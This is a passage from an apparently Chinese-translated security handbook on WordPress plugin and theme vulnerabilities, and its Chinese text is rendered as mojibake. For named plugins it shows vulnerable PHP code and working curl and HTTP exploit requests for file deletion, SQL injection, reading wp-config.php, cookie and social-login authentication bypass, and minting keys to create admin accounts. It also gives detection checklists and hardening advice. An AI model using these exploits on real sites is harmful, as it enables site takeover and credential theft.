- æ’ä»¶å°†å®¢æˆ·ç«¯å¯æ§çš„ header æ˜ å°„åˆ°è®¤è¯çŠ¶æ€å¹¶è·³è¿‡èƒ½åŠ›æ£€æŸ¥ã€‚
- WordPress core å¯¹æ­¤è·¯ç”±æœŸæœ› `create_users` èƒ½åŠ›ï¼›è¯¥æ’ä»¶é€šè¿‡ç›´æ¥ä» header è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡æ¥ç»•è¿‡æ­¤æ£€æŸ¥ã€‚

Expected success indicators

- HTTP 201ï¼Œè¿”å›æè¿°å·²åˆ›å»ºç”¨æˆ·çš„ JSON bodyã€‚
- åœ¨ `wp-admin/users.php` ä¸­å¯è§æ–°çš„ admin ç”¨æˆ·ã€‚

Detection checklist

- ä½¿ç”¨ grep æœç´¢ `getallheaders()`, `$_SERVER['HTTP_...']`ï¼Œæˆ–è¯»å–è‡ªå®šä¹‰ header æ¥è®¾ç½®ç”¨æˆ·ä¸Šä¸‹æ–‡çš„ vendor SDKï¼ˆä¾‹å¦‚ `wp_set_current_user()`, `wp_set_auth_cookie()`ï¼‰ã€‚
- æ£€æŸ¥ REST æ³¨å†Œï¼ŒæŸ¥æ‰¾ç¼ºä¹å¥å£® `permission_callback` æ£€æŸ¥ä¸”ä¾èµ–è¯·æ±‚å¤´çš„ç‰¹æƒå›è°ƒã€‚
- æŸ¥æ‰¾åœ¨åªç”± header å€¼é—¨æ§çš„ REST å¤„ç†ç¨‹åºä¸­ä½¿ç”¨æ ¸å¿ƒç”¨æˆ·ç®¡ç†å‡½æ•°ï¼ˆ`wp_insert_user`, `wp_create_user`ï¼‰çš„æƒ…å†µã€‚

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress ä¸»é¢˜å’Œæ’ä»¶ç»å¸¸é€šè¿‡ `wp_ajax_` å’Œ `wp_ajax_nopriv_` é’©å­æš´éœ² AJAX å¤„ç†å™¨ã€‚å½“ä½¿ç”¨ **_nopriv_** å˜ä½“æ—¶ï¼Œ**å›è°ƒå°†å¯è¢«æœªè®¤è¯è®¿å®¢è®¿é—®**ï¼Œå› æ­¤ä»»ä½•æ•æ„Ÿæ“ä½œè¿˜å¿…é¡»é¢å¤–å®ç°ï¼š

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
æ­¤ä»£ç ç‰‡æ®µå¼•å…¥çš„é—®é¢˜ï¼š

* **Unauthenticated access** â€“ æ³¨å†Œäº† `wp_ajax_nopriv_` hookã€‚
* **No nonce / capability check** â€“ ä»»ä½•è®¿å®¢éƒ½å¯ä»¥è®¿é—®è¯¥ç«¯ç‚¹ã€‚
* **No path sanitisation** â€“ ç”¨æˆ·æ§åˆ¶çš„ `fontfamily` å­—ç¬¦ä¸²æœªç»è¿‡æ»¤å°±è¢«æ‹¼æ¥åˆ°æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ä¸Šï¼Œå…è®¸ç»å…¸çš„ `../../` traversalã€‚

#### Exploitation

æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€å•ä¸ª HTTP POST è¯·æ±‚åˆ é™¤ä½äº **uploads åŸºç›®å½•ä»¥ä¸‹**ï¼ˆé€šå¸¸ä¸º `<wp-root>/wp-content/uploads/`ï¼‰çš„ä»»ä½•æ–‡ä»¶æˆ–ç›®å½•ï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
å› ä¸º `wp-config.php` ä½äº *uploads* ä¹‹å¤–ï¼Œåœ¨é»˜è®¤å®‰è£…ä¸­å››ä¸ª `../` åºåˆ—å°±è¶³å¤Ÿäº†ã€‚åˆ é™¤ `wp-config.php` ä¼šåœ¨ä¸‹ä¸€æ¬¡è®¿é—®æ—¶å¼ºåˆ¶ WordPress è¿›å…¥ *å®‰è£…å‘å¯¼*ï¼Œä»è€Œå®ç°å®Œæ•´ç«™ç‚¹æ¥ç®¡ï¼ˆæ”»å‡»è€…åªéœ€æä¾›æ–°çš„ DB é…ç½®å¹¶åˆ›å»ºä¸€ä¸ª admin ç”¨æˆ·ï¼‰ã€‚

å…¶ä»–æœ‰å½±å“çš„ç›®æ ‡åŒ…æ‹¬æ’ä»¶/ä¸»é¢˜çš„ `.php` æ–‡ä»¶ï¼ˆç”¨äºç ´åå®‰å…¨æ’ä»¶ï¼‰æˆ– `.htaccess` è§„åˆ™ã€‚

#### æ£€æµ‹æ¸…å•

* ä»»ä½•è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿè¾…åŠ©å‡½æ•°ï¼ˆ`copy()`, `unlink()`, `$wp_filesystem->delete()` ç­‰ï¼‰çš„ `add_action( 'wp_ajax_nopriv_...')` å›è°ƒã€‚
* å°†æœªæ¸…ç†çš„ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°è·¯å¾„ä¸­ï¼ˆæŸ¥æ‰¾ `$_POST`, `$_GET`, `$_REQUEST`ï¼‰ã€‚
* ç¼ºå°‘ `check_ajax_referer()` å’Œ `current_user_can()`/`is_user_logged_in()`ã€‚

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

è®¸å¤šæ’ä»¶é€šè¿‡åœ¨ user meta ä¸­ä¿å­˜åŸå§‹è§’è‰²ä»¥ä¾¿ç¨åæ¢å¤ï¼Œæ¥å®ç° "view as role" æˆ–ä¸´æ—¶åˆ‡æ¢è§’è‰²çš„åŠŸèƒ½ã€‚å¦‚æœæ¢å¤è·¯å¾„ä»…ä¾èµ–è¯·æ±‚å‚æ•°ï¼ˆä¾‹å¦‚ `$_REQUEST['reset-for']`ï¼‰å’Œæ’ä»¶ç»´æŠ¤çš„åˆ—è¡¨ï¼Œè€Œæ²¡æœ‰æ£€æŸ¥ capabilities å’Œæœ‰æ•ˆçš„ nonceï¼Œåˆ™ä¼šå¯¼è‡´ vertical privilege escalationã€‚

åœ¨ Admin and Site Enhancements (ASE) æ’ä»¶ï¼ˆâ‰¤ 7.6.2.1ï¼‰ä¸­å‘ç°äº†ä¸€ä¸ªçœŸå®æ¡ˆä¾‹ã€‚reset åˆ†æ”¯å¦‚æœåœ¨å†…éƒ¨æ•°ç»„ `$options['viewing_admin_as_role_are']` ä¸­æ‰¾åˆ° `reset-for=<username>`ï¼Œå°±ä¼šåŸºäºè¯¥é¡¹æ¢å¤è§’è‰²ï¼Œä½†åœ¨åˆ é™¤å½“å‰è§’è‰²å¹¶ä» user meta `_asenha_view_admin_as_original_roles` é‡æ–°æ·»åŠ ä¿å­˜çš„è§’è‰²ä¹‹å‰ï¼Œæ—¢æ²¡æœ‰æ‰§è¡Œ `current_user_can()` æ£€æŸ¥ï¼Œä¹Ÿæ²¡æœ‰è¿›è¡Œ nonce éªŒè¯ï¼š
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ä¸ºä»€ä¹ˆä¼šè¢«åˆ©ç”¨

- ä¿¡ä»» `$_REQUEST['reset-for']` å’Œä¸€ä¸ªæ’ä»¶é€‰é¡¹ï¼Œä½†æ²¡æœ‰æœåŠ¡å™¨ç«¯æˆæƒã€‚
- å¦‚æœç”¨æˆ·ä»¥å‰åœ¨ `_asenha_view_admin_as_original_roles` ä¸­ä¿å­˜è¿‡æ›´é«˜æƒé™å¹¶è¢«é™çº§ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡è®¿é—®é‡ç½®è·¯å¾„æ¢å¤è¿™äº›æƒé™ã€‚
- åœ¨æŸäº›éƒ¨ç½²ä¸­ï¼Œä»»ä½•å·²è®¤è¯ç”¨æˆ·éƒ½å¯ä»¥ä¸ºä»å­˜åœ¨äº `viewing_admin_as_role_are` çš„å…¶ä»–ç”¨æˆ·åè§¦å‘é‡ç½®ï¼ˆæˆæƒç¼ºé™·ï¼‰ã€‚

åˆ©ç”¨ç¤ºä¾‹
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
åœ¨æ˜“å—æ”»å‡»çš„æ„å»ºä¸­ï¼Œè¿™ä¼šç§»é™¤å½“å‰è§’è‰²å¹¶é‡æ–°æ·»åŠ ä¿å­˜çš„åŸå§‹è§’è‰²ï¼ˆä¾‹å¦‚ `administrator`ï¼‰ï¼Œeffectively escalating privilegesã€‚

Detection checklist

- æŸ¥æ‰¾åœ¨ user meta ä¸­æŒä¹…åŒ–â€œåŸå§‹è§’è‰²â€çš„è§’è‰²åˆ‡æ¢åŠŸèƒ½ï¼ˆä¾‹å¦‚ `_asenha_view_admin_as_original_roles`ï¼‰ã€‚
- è¯†åˆ«é‡ç½®/æ¢å¤çš„è·¯å¾„ï¼š
  - ä» `$_REQUEST` / `$_GET` / `$_POST` è¯»å–ç”¨æˆ·åã€‚
  - é€šè¿‡ `add_role()` / `remove_role()` ä¿®æ”¹è§’è‰²ï¼Œä½†æ²¡æœ‰ä½¿ç”¨ `current_user_can()` å’Œ `wp_verify_nonce()` / `check_admin_referer()`ã€‚
  - åŸºäºæ’ä»¶é€‰é¡¹æ•°ç»„ï¼ˆä¾‹å¦‚ `viewing_admin_as_role_are`ï¼‰è¿›è¡Œæˆæƒï¼Œè€Œä¸æ˜¯åŸºäºæ‰§è¡Œè€…çš„ capabilitiesã€‚

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

ä¸€äº›æ’ä»¶å°†ç”¨æˆ·åˆ‡æ¢åŠ©æ‰‹æŒ‚æ¥åˆ°å…¬å…± `init` é’©å­ï¼Œå¹¶ä»å®¢æˆ·ç«¯å¯æ§çš„ cookie æ´¾ç”Ÿèº«ä»½ã€‚å¦‚æœä»£ç åœ¨æ²¡æœ‰éªŒè¯èº«ä»½ã€æƒé™å’Œæœ‰æ•ˆ nonce çš„æƒ…å†µä¸‹è°ƒç”¨ `wp_set_auth_cookie()`ï¼Œä»»ä½•æœªè®¤è¯çš„è®¿å®¢éƒ½å¯ä»¥å¼ºåˆ¶ä»¥ä»»æ„ç”¨æˆ· ID ç™»å½•ã€‚

å…¸å‹æ˜“å—æ”»å‡»çš„æ¨¡å¼ï¼ˆç®€åŒ–è‡ª Service Finder Bookings â‰¤ 6.1ï¼‰ï¼š
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ä¸ºä»€ä¹ˆå¯è¢«åˆ©ç”¨

- å…¬å…± `init` é’©å­ä½¿å¤„ç†ç¨‹åºå¯è¢«æœªè®¤è¯çš„ç”¨æˆ·è®¿é—®ï¼ˆæ²¡æœ‰ `is_user_logged_in()` ä¿æŠ¤ï¼‰ã€‚
- èº«ä»½æ¥æºäºå®¢æˆ·ç«¯å¯ä¿®æ”¹çš„ cookieï¼ˆ`original_user_id`ï¼‰ã€‚
- ç›´æ¥è°ƒç”¨ `wp_set_auth_cookie($uid)` ä¼šåœ¨æ²¡æœ‰ä»»ä½•æƒé™/nonce æ£€æŸ¥çš„æƒ…å†µä¸‹å°†è¯·æ±‚è€…ä»¥è¯¥ç”¨æˆ·ç™»å½•ã€‚

åˆ©ç”¨ï¼ˆæœªè®¤è¯ï¼‰
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

é€šç”¨ edge/server WAFs é’ˆå¯¹å¸¸è§æ¨¡å¼ï¼ˆSQLiã€XSSã€LFIï¼‰è¿›è¡Œè°ƒæ•´ã€‚è®¸å¤šé«˜å½±å“çš„ WordPress/plugin æ¼æ´å±äºåº”ç”¨å±‚ç‰¹å®šçš„é€»è¾‘/è®¤è¯ç¼ºé™·ï¼Œé™¤éå¼•æ“ç†è§£ WordPress è·¯ç”±å’Œ plugin è¯­ä¹‰ï¼Œå¦åˆ™è¿™äº›è¯·æ±‚çœ‹èµ·æ¥åƒæ­£å¸¸æµé‡ã€‚

Offensive notes

- é’ˆå¯¹ plugin-specific endpoints ä½¿ç”¨ clean payloadsï¼š`admin-ajax.php?action=...`ã€`wp-json/<namespace>/<route>`ã€custom file handlersã€shortcodesã€‚
- å…ˆæµ‹è¯• unauth pathsï¼ˆAJAX `nopriv`ã€REST å¸¦å®½æ¾çš„ `permission_callback`ã€public shortcodesï¼‰ã€‚é»˜è®¤ payloads å¾€å¾€æ— éœ€æ··æ·†å³å¯æˆåŠŸã€‚
- å…¸å‹é«˜å½±å“æƒ…å½¢ï¼šprivilege escalationï¼ˆè®¿é—®æ§åˆ¶å¤±æ•ˆï¼‰ã€arbitrary file upload/downloadã€LFIã€open redirectã€‚

Defensive notes

- ä¸è¦ä¾èµ–é€šç”¨ WAF ç­¾åæ¥ä¿æŠ¤ plugin CVEsã€‚åº”å®æ–½åº”ç”¨å±‚ã€é’ˆå¯¹æ¼æ´çš„è™šæ‹Ÿè¡¥ä¸æˆ–å°½å¿«æ›´æ–°ã€‚
- åœ¨ä»£ç ä¸­ä¼˜å…ˆä½¿ç”¨æ­£å‘å®‰å…¨æ£€æŸ¥ï¼ˆcapabilitiesã€noncesã€ä¸¥æ ¼çš„è¾“å…¥éªŒè¯ï¼‰ï¼Œè€Œéä¾èµ–è´Ÿå‘çš„ regex è¿‡æ»¤ã€‚

## WordPress Protection

### Regular Updates

ç¡®ä¿ WordPressã€plugins å’Œ themes å·²ä¸ºæœ€æ–°ç‰ˆæœ¬ã€‚è¿˜è¦ç¡®è®¤åœ¨ wp-config.php ä¸­å¯ç”¨äº†è‡ªåŠ¨æ›´æ–°ï¼š
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
æ­¤å¤–ï¼Œ**åªå®‰è£…å¯ä¿¡çš„ WordPress æ’ä»¶å’Œä¸»é¢˜**ã€‚

### å®‰å…¨æ’ä»¶

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **å…¶ä»–å»ºè®®**

- ç§»é™¤é»˜è®¤ **admin** ç”¨æˆ·
- ä½¿ç”¨ **å¼ºå¯†ç ** å’Œ **2FA**
- å®šæœŸ **å®¡æŸ¥** ç”¨æˆ· **æƒé™**
- **é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°** ä»¥é˜²æ­¢ Brute Force æ”»å‡»
- é‡å‘½å **`wp-admin.php`** æ–‡ä»¶ï¼Œå¹¶ä»…å…è®¸å†…éƒ¨æˆ–æ¥è‡ªç‰¹å®š IP åœ°å€çš„è®¿é—®ã€‚


### æœªç»è®¤è¯çš„ SQL Injectionï¼ˆç”±äºéªŒè¯ä¸è¶³ï¼‰(WP Job Portal <= 2.3.2)

WP Job Portal çš„æ‹›è˜æ’ä»¶æš´éœ²äº†ä¸€ä¸ª **savecategory** ä»»åŠ¡ï¼Œè¯¥ä»»åŠ¡æœ€ç»ˆåœ¨ `modules/category/model.php::validateFormData()` ä¸­æ‰§è¡Œä»¥ä¸‹å­˜åœ¨æ¼æ´çš„ä»£ç ï¼š
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
è¯¥ä»£ç ç‰‡æ®µå¼•å…¥çš„é—®é¢˜ï¼š

1. **æœªæ¶ˆæ¯’çš„ç”¨æˆ·è¾“å…¥** â€“ `parentid` ç›´æ¥æ¥è‡ª HTTP è¯·æ±‚ã€‚
2. **åœ¨ WHERE å­å¥ä¸­çš„å­—ç¬¦ä¸²æ‹¼æ¥** â€“ æœªä½¿ç”¨ `is_numeric()` / `esc_sql()` / é¢„å¤„ç†è¯­å¥ã€‚
3. **æœªè®¤è¯å³å¯è®¿é—®** â€“ å°½ç®¡è¯¥ action é€šè¿‡ `admin-post.php` æ‰§è¡Œï¼Œå”¯ä¸€çš„æ ¡éªŒæ˜¯ **CSRF nonce** (`wp_verify_nonce()`)ï¼Œä»»ä½•è®¿å®¢éƒ½å¯ä»¥ä»åŒ…å«çŸ­ä»£ç  `[wpjobportal_my_resumes]` çš„å…¬å¼€é¡µé¢è·å–å®ƒã€‚

#### åˆ©ç”¨

1. è·å–ä¸€ä¸ªæ–°çš„ nonceï¼š
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. é€šè¿‡æ»¥ç”¨ `parentid` æ³¨å…¥ä»»æ„ SQLï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
å“åº”ä¼šæ³„éœ²æ³¨å…¥æŸ¥è¯¢çš„ç»“æœæˆ–ä¿®æ”¹æ•°æ®åº“ï¼Œä»è€Œè¯æ˜å­˜åœ¨ SQLiã€‚


### æœªè®¤è¯çš„ä»»æ„æ–‡ä»¶ä¸‹è½½ / Path Traversal (WP Job Portal <= 2.3.2)

å¦ä¸€ä¸ªä»»åŠ¡ **downloadcustomfile** å…è®¸è®¿å®¢é€šè¿‡ path traversal ä¸‹è½½ç£ç›˜ä¸Šçš„ **ä»»æ„æ–‡ä»¶**ã€‚æ¼æ´æ±‡èšç‚¹ä½äº `modules/customfield/model.php::downloadCustomUploadedFile()`ï¼š
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` æ˜¯æ”»å‡»è€…å¯æ§å¹¶è¢«æ‹¼æ¥ï¼Œ**æœªç»è¿‡è¿‡æ»¤**ã€‚å†æ¬¡è¯´æ˜ï¼Œå”¯ä¸€çš„é—¨æ§›æ˜¯å¯ä»¥ä» resume é¡µé¢è·å–çš„ **CSRF nonce**ã€‚

#### åˆ©ç”¨
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
æœåŠ¡å™¨å“åº”åŒ…å« `wp-config.php` çš„å†…å®¹ï¼Œleaking DB credentials and auth keysã€‚

## é€šè¿‡ Social Login AJAX fallback å®ç°æœªè®¤è¯è´¦æˆ·æ¥ç®¡ï¼ˆJobmonster Theme <= 4.7.9ï¼‰

è®¸å¤š themes/plugins ä¼šé€šè¿‡ `admin-ajax.php` æš´éœ² "social login" helpersã€‚å¦‚æœä¸€ä¸ªæœªè®¤è¯çš„ AJAX action (`wp_ajax_nopriv_...`) åœ¨ provider æ•°æ®ç¼ºå¤±æ—¶ä¿¡ä»»å®¢æˆ·ç«¯æä¾›çš„æ ‡è¯†ç¬¦å¹¶éšåè°ƒç”¨ `wp_set_auth_cookie()`ï¼Œåˆ™ä¼šå¯¼è‡´å®Œå…¨çš„è®¤è¯ç»•è¿‡ã€‚

å…¸å‹çš„æœ‰ç¼ºé™·çš„æ¨¡å¼ï¼ˆç®€åŒ–ï¼‰
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Why itâ€™s exploitable

- é€šè¿‡ admin-ajax.php å¯åœ¨æœªè®¤è¯æƒ…å†µä¸‹è®¿é—®ï¼ˆwp_ajax_nopriv_â€¦ actionï¼‰ã€‚
- åœ¨è¿›è¡ŒçŠ¶æ€æ›´æ”¹å‰æ²¡æœ‰ nonce æˆ– capability æ£€æŸ¥ã€‚
- ç¼ºå°‘ OAuth/OpenID provider éªŒè¯ï¼›é»˜è®¤åˆ†æ”¯ä¼šæ¥å—æ”»å‡»è€…è¾“å…¥ã€‚
- get_user_by('email', $_POST['id']) åæ¥ wp_set_auth_cookie($uid) ä¼šæŠŠè¯·æ±‚è€…è®¤è¯ä¸ºä»»ä½•å­˜åœ¨çš„é‚®ç®±åœ°å€å¯¹åº”çš„ç”¨æˆ·ã€‚

Exploitation (unauthenticated)

- Prerequisites: attacker can reach /wp-admin/admin-ajax.php and knows/guesses a valid user email.
- Set provider to an unsupported value (or omit it) to hit the default branch and pass id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200ï¼Œå“åº”ä½“ä¸º JSONï¼Œç±»ä¼¼ {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* ä¸ºå—å®³ç”¨æˆ·è®¾ç½®ï¼›éšåçš„è¯·æ±‚å°†è¢«è®¤è¯ã€‚

Finding the action name

- æ£€æŸ¥ä¸»é¢˜/æ’ä»¶çš„ social login ä»£ç ä¸­æ˜¯å¦æœ‰ add_action('wp_ajax_nopriv_...', '...') æ³¨å†Œï¼ˆä¾‹å¦‚ framework/add-ons/social-login/class-social-login.phpï¼‰ã€‚
- åœ¨ AJAX å¤„ç†ç¨‹åºä¸­ grep æŸ¥æ‰¾ wp_set_auth_cookie(), get_user_by('email', ...)ã€‚

Detection checklist

- Web æ—¥å¿—æ˜¾ç¤ºæœªè®¤è¯çš„ POST åˆ° /wp-admin/admin-ajax.phpï¼ŒåŒ…å« social-login action å’Œ id=<email>ã€‚
- 200 å“åº”å¹¶è¿”å›æˆåŠŸ JSONï¼Œç´§æ¥ç€æ¥è‡ªç›¸åŒ IP/User-Agent çš„å·²è®¤è¯æµé‡ã€‚

Hardening

- ä¸è¦ä»å®¢æˆ·ç«¯è¾“å…¥æ¨æ–­èº«ä»½ã€‚åªæ¥å—æ¥è‡ªå·²éªŒè¯ provider token/ID çš„ emails/IDsã€‚
- å³ä¾¿æ˜¯ç™»å½•è¾…åŠ©ä¹Ÿè¦è¦æ±‚ CSRF nonces å’Œ capability checksï¼›é™¤éç»å¯¹å¿…è¦ï¼Œå¦åˆ™é¿å…æ³¨å†Œ wp_ajax_nopriv_ã€‚
- åœ¨æœåŠ¡å™¨ç«¯éªŒè¯å’Œæ ¸å® OAuth/OIDC å“åº”ï¼›æ‹’ç»ç¼ºå¤±/æ— æ•ˆçš„ providersï¼ˆä¸è¦å›é€€åˆ° POST idï¼‰ã€‚
- è€ƒè™‘æš‚æ—¶ç¦ç”¨ social loginï¼Œæˆ–åœ¨è¾¹ç¼˜è¿›è¡Œè™šæ‹Ÿä¿®è¡¥ï¼ˆé˜»æ–­æ˜“å—æ”»å‡»çš„ actionï¼‰ç›´åˆ°ä¿®å¤ã€‚

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

Some plugins expose REST endpoints that mint reusable â€œconnection keysâ€ or tokens without verifying the callerâ€™s capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions â†’ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ é“¸é€ ä¸€ä¸ª connection key å¹¶ä½¿ç”¨å®ƒ
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
ä¸ºä½•å¯è¢«åˆ©ç”¨
- æ•æ„Ÿçš„ REST route ä»…ç”±ä½ç†µçš„èº«ä»½è¯æ˜ï¼ˆusernameï¼‰ä¿æŠ¤ï¼Œæˆ–ç¼ºå°‘ permission_callback
- æ²¡æœ‰ capability å¼ºåˆ¶æ£€æŸ¥ï¼›ç”Ÿæˆçš„ key è¢«è§†ä¸ºé€šç”¨ç»•è¿‡

æ£€æµ‹æ¸…å•
- åœ¨æ’ä»¶ä»£ç ä¸­ç”¨ grep æŸ¥æ‰¾ register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- ä»»ä½•æ ¹æ®è¯·æ±‚æä¾›çš„èº«ä»½ï¼ˆusername/emailï¼‰å‘æ”¾ tokens/keys çš„ routeï¼Œä¸”æœªç»‘å®šåˆ°å·²è®¤è¯ç”¨æˆ·æˆ– capability
- æŸ¥æ‰¾åç»­æ¥å—è¯¥ç”Ÿæˆ token/key çš„ routesï¼Œä½†æ²¡æœ‰æœåŠ¡ç«¯ capability æ£€æŸ¥

åŠ å›ºå»ºè®®
- å¯¹äºä»»ä½•ç‰¹æƒ REST routeï¼šè¦æ±‚ permission_callback å¼ºåˆ¶è°ƒç”¨ current_user_can() æ¥æ£€æŸ¥æ‰€éœ€ capability
- ä¸è¦åŸºäºå®¢æˆ·ç«¯æä¾›çš„èº«ä»½ç”Ÿæˆé•¿æœŸæœ‰æ•ˆçš„ keysï¼›å¦‚æœ‰å¿…è¦ï¼Œåº”åœ¨è®¤è¯åå‘æ”¾çŸ­æœŸã€ç»‘å®šç”¨æˆ·çš„ tokensï¼Œå¹¶åœ¨ä½¿ç”¨æ—¶é‡æ–°æ£€æŸ¥ capability
- éªŒè¯è°ƒç”¨è€…çš„ç”¨æˆ·ä¸Šä¸‹æ–‡ï¼ˆä»…è°ƒç”¨ wp_set_current_user ä¸è¶³ä»¥ä¿è¯ï¼‰ï¼Œå¹¶æ‹’ç»æ»¡è¶³ !is_user_logged_in() || !current_user_can(<cap>) çš„è¯·æ±‚

---

## Nonce gate æ»¥ç”¨ â†’ æœªè®¤è¯çš„ä»»æ„æ’ä»¶å®‰è£… (FunnelKit Automations â‰¤ 3.5.3)

